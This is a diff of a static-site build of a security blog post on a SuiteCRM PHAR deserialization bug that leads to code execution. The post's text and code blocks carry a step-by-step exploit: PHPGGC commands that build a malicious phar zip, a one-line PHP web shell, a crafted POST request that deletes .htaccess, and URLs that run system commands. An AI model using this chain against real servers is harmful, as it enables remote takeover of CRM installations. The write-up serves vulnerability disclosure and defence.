@@ -42,11 +42,11 @@
   
   <!-- Facebook OGP cards -->
   <meta property="og:description" content="This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/" />
-  <meta property="og:url" content="http://snoopysecurity.github.io" />
+  <meta property="og:url" content="http://localhost:4000" />
   <meta property="og:site_name" content="💻 | Blog" />
   <meta property="og:title" content="SuiteCRM - Phar Deserialization to Code Execution" />
   <meta property="og:type" content="website" />
-  <meta property="og:image" content="http://snoopysecurity.github.io/assets/suitecrm/1.png" />
+  <meta property="og:image" content="http://localhost:4000/assets/suitecrm/1.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="612" />
   <meta property="og:image:height" content="605" />
@@ -57,16 +57,16 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="SuiteCRM - Phar Deserialization to Code Execution">
   <meta name="twitter:description" content="This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/">
-  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/suitecrm/1.png">
-  <meta name="twitter:url" content="http://snoopysecurity.github.io">
+  <meta name="twitter:image" content="http://localhost:4000/assets/suitecrm/1.png">
+  <meta name="twitter:url" content="http://localhost:4000">
   
 
   
 
   <!-- Site styles -->
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://snoopysecurity.github.io/web-application-security/2021/05/09/suitecrm-phar-deserialization.html">
-  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://snoopysecurity.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/web-application-security/2021/05/09/suitecrm-phar-deserialization.html">
+  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
 </head>
 
 
@@ -151,7 +151,7 @@
 
 <p>In PHP, PHAR (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses a single file format which can be used to store and execute multiple PHP code. PHAR files contain metadata about the files in the archive. In a PHAR file, this metadata is stored in a serialized format.</p>
 
-<p>If a file operation is performed on a PHAR file via the <code class="highlighter-rouge">phar://</code> wrapper, the PHAR file’s metadata would be unserialized. As such, an attacker could perform PHP object injection without the use of the <code class="highlighter-rouge">unserialize()</code> function by uploading a PHAR file. This vulnerability notably gained popularity after Sam Thomas published his research work at BlackHat USA 2018 titled, <a href="https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078">It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It</a>, which affected multiple Content Management Systems. In order to exploit this vulnerability, two conditions must be met:</p>
+<p>If a file operation is performed on a PHAR file via the <code class="language-plaintext highlighter-rouge">phar://</code> wrapper, the PHAR file’s metadata would be unserialized. As such, an attacker could perform PHP object injection without the use of the <code class="language-plaintext highlighter-rouge">unserialize()</code> function by uploading a PHAR file. This vulnerability notably gained popularity after Sam Thomas published his research work at BlackHat USA 2018 titled, <a href="https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078">It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It</a>, which affected multiple Content Management Systems. In order to exploit this vulnerability, two conditions must be met:</p>
 
 <ul>
   <li>A PHP filesystem function such as “file_exists” that can be controlled which will trigger the unserialize() function</li>
@@ -206,17 +206,15 @@
 <p>With the path of an uploaded zip file now known, a file deletion gadget being present, and functions that trigger Phar deserialization being available, it is possible to leverage these conditions to exploit a SuiteCRM installation.</p>
 
 <p>Using <a href="https://github.com/ambionics/phpggc">PHPGGC</a>, an example phar file can be created as follows:</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>./phpggc -p zip -o /tmp/malicious.zip -f ZendFramework/FD1 /tmp/test.txt
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./phpggc -p zip -o /tmp/malicious.zip -f ZendFramework/FD1 /tmp/test.txt
+</code></pre></div></div>
 
 <p>The above command will create a phar file with ZIP format and call it malicious.zip. This will insert a serialized payload of the previously mentioned zf1/zend-http POP gadget and set the $stream_name property of this serialized object to be /tmp/test.txt. Furthermore, the -f option within PHPGGC can also be used to ensure that the serialized object will be destroyed right after the unserialize() call, making the payload more reliable.</p>
 
 <p>Note: In order for this zip file to be accepted by the application, an example manifest.php file should also be added to the zip. This can be done as follows within Linux:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>zip -rv malicious.zip manifest.php
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip -rv malicious.zip manifest.php
+</code></pre></div></div>
 <p>Once uploaded, this file will now be located in the upload/upgrades/module directory.</p>
 
 <p><img src="/assets/suitecrm/7.png" alt="" /></p>
@@ -244,7 +242,7 @@
 <p>So, to summarize, PHAR deserialization to code execution is as follows:</p>
 
 <ol>
-  <li>Upload a file to the SuiteCRM through its normal storage functionality. In this instance the following is uploaded as shell.php: <code class="highlighter-rouge">&lt;?php echo system($_GET["cmd"]); ?&gt;</code></li>
+  <li>Upload a file to the SuiteCRM through its normal storage functionality. In this instance the following is uploaded as shell.php: <code class="language-plaintext highlighter-rouge">&lt;?php echo system($_GET["cmd"]); ?&gt;</code></li>
 </ol>
 
 <p><img src="/assets/suitecrm/10.png" alt="" /></p>
@@ -257,9 +255,8 @@
 
 <p>PHPGGC can be used as follows:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>./phpggc -p zip -o /tmp/maliciousmodule.zip -f ZendFramework/FD1 /var/www/html/.htaccess 
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./phpggc -p zip -o /tmp/maliciousmodule.zip -f ZendFramework/FD1 /var/www/html/.htaccess 
+</code></pre></div></div>
 
 <p>The following code can then be added to a manifest.php file and then added to the PHAR ZIP archive.</p>
 
@@ -273,7 +270,7 @@
 
 <p>The Backups area can be used to trigger Phar deserialization. The HTTP request send to the application is as follows:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>POST /index.php?module=Administration&amp;action=Backups HTTP/1.1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /index.php?module=Administration&amp;action=Backups HTTP/1.1
 Host: suitecrm.local
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -288,8 +285,7 @@ Cookie: sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; E
 Upgrade-Insecure-Requests: 1
 
 backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmaliciousmodule.zip&amp;backup_zip=s&amp;run=confirm
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ol>
   <li>Access the malicousmodule manifest file by browsing to the directory path and include the uploaded shell.php.txt</li>
@@ -297,21 +293,18 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
 
 <p>Now that the .htaccess file is deleted. The upload directory is accessible. The malcioiusmodule-manifest.php is now accessible as follows:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php
+</code></pre></div></div>
 
 <p>The ?123 can now be specified and the shell.php.txt file can be provided</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41
+</code></pre></div></div>
 
 <p>The included shell.php.txt will be interpreted as code, and the cmd parameter can be provided which will be executed by the system command.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41&amp;cmd=id
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41&amp;cmd=id
+</code></pre></div></div>
 
 <p><img src="/assets/suitecrm/12.png" alt="" /></p>
 
@@ -334,7 +327,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
   
     
     
-      <a href="//twitter.com/share?text=SuiteCRM+-+Phar+Deserialization+to+Code+Execution&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html&via=snoopysecurity"
+      <a href="//twitter.com/share?text=SuiteCRM+-+Phar+Deserialization+to+Code+Execution&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html&via=snoopysecurity"
         onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
         <i class="fa fa-twitter-square fa-lg"></i>
       </a>
@@ -349,7 +342,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
     
     
     
-      <a href="//www.facebook.com/sharer.php?t=SuiteCRM+-+Phar+Deserialization+to+Code+Execution&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html"
+      <a href="//www.facebook.com/sharer.php?t=SuiteCRM+-+Phar+Deserialization+to+Code+Execution&u=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html"
         onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
         <i class="fa fa-facebook-square fa-lg"></i>
       </a>
@@ -374,7 +367,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
     
     
     
-      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html"
+      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html"
         onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
         <i class="fa fa-linkedin-square fa-lg"></i>
       </a>
@@ -416,7 +409,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
     
     
     
-      <a href="//www.pinterest.com/pin/create/button/?description=SuiteCRM+-+Phar+Deserialization+to+Code+Execution&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html&media=http://snoopysecurity.github.io/assets/suitecrm/1.png"
+      <a href="//www.pinterest.com/pin/create/button/?description=SuiteCRM+-+Phar+Deserialization+to+Code+Execution&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2021%2F05%2F09%2Fsuitecrm-phar-deserialization.html&media=http://localhost:4000/assets/suitecrm/1.png"
         onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
         <i class="fa fa-pinterest-square fa-lg"></i>
       </a>
